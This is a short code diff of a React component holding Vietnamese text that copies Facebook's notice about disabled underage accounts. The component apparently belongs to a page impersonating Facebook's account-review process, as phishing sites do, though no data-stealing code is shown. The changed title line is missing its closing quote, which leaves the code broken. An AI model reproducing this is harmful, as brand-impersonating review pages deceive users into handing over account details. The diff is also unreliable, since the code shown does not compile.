@@ -5,7 +5,7 @@ import { translateText } from '@/utils/translate';
 const SendInfo = () => {
     const defaultTexts = useMemo(
         () => ({
-            title: 'Chúng tôi đã nhận được thông tin của bạn',
+            title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi. ,
             description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
             description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.',
         }),
